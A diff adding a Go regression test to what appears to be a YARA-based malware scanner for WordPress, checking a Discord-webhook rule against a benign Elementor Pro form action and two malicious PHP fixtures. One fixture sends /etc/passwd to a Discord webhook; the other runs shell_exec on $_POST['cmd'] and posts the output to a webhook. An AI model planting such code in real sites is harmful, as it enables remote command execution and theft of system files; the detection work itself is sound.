@@ -233,3 +233,69 @@ class UpdraftPlus {
 		t.Error("webshell_generic_passthru regression: base64_decode-wrapped superglobal feed was not detected")
 	}
 }
+
+
+// FP reconstruction: Elementor Pro's pro-elements/modules/forms/actions/
+// discord.php embeds the Discord webhook URL twice (once as a placeholder
+// in the form-builder UI, once as a strpos() guard before posting via
+// wp_remote_post). The previous YARA rule fired on the URL alone -
+// "any of them" with the URL strings as the only matchable patterns -
+// which produced a Critical/High YARA alert on every legitimate Elementor
+// Pro form integration. The YAML rule with the same name was tightened
+// in the same change set to require an exfiltration indicator alongside
+// the URL; the YARA rule must do the same or the FP just moves into a
+// different alert pipeline.
+
+func TestDropperDiscordWebhookYARA_ElementorProFormAction(t *testing.T) {
+	scanner := loadRepoYaraScanner(t)
+
+	// Shape reconstructed from the actual file: webhook URL referenced
+	// twice as configuration data (placeholder + guard), wp_remote_post
+	// used to deliver, no file reads, no shell exec, no eval.
+	legit := []byte(`<?php
+namespace ElementorPro\Modules\Forms\Actions;
+class Discord extends Action_Base {
+    public function get_name() { return 'discord'; }
+    public function register_settings_section($widget) {
+        $widget->add_control('discord_webhook', [
+            'placeholder' => 'https://discordapp.com/api/webhooks/',
+        ]);
+    }
+    public function run($record, $ajax_handler) {
+        $settings = $record->get('form_settings');
+        if (false === strpos($settings['discord_webhook'], 'https://discordapp.com/api/webhooks/')) {
+            return;
+        }
+        $response = wp_remote_post($settings['discord_webhook'], [
+            'body' => wp_json_encode($settings),
+            'headers' => ['Content-Type' => 'application/json; charset=utf-8'],
+        ]);
+    }
+}
+`)
+	if hasYaraRule(scanner.ScanBytes(legit), "dropper_discord_webhook") {
+		t.Error("dropper_discord_webhook YARA FP: matched Elementor Pro discord.php (webhook URL as configuration + wp_remote_post; no exfil indicator)")
+	}
+
+	// Real exfil dropper: posts /etc/passwd contents to a hardcoded
+	// webhook. Must keep firing.
+	maliciousExfil := []byte(`<?php
+$d = file_get_contents('/etc/passwd');
+file_get_contents('https://discord.com/api/webhooks/123/abc?content=' . urlencode($d));
+`)
+	if !hasYaraRule(scanner.ScanBytes(maliciousExfil), "dropper_discord_webhook") {
+		t.Error("dropper_discord_webhook YARA regression: real /etc/passwd to Discord webhook exfil was not detected")
+	}
+
+	// Real C2: shell-exec on superglobal input, results posted to
+	// webhook. Must keep firing.
+	maliciousC2 := []byte(`<?php
+$out = shell_exec($_POST['cmd']);
+$ch = curl_init('https://discordapp.com/api/webhooks/999/zzz');
+curl_setopt($ch, CURLOPT_POSTFIELDS, ['content' => $out]);
+curl_exec($ch);
+`)
+	if !hasYaraRule(scanner.ScanBytes(maliciousC2), "dropper_discord_webhook") {
+		t.Error("dropper_discord_webhook YARA regression: shell_exec C2 with Discord callback was not detected")
+	}
+}
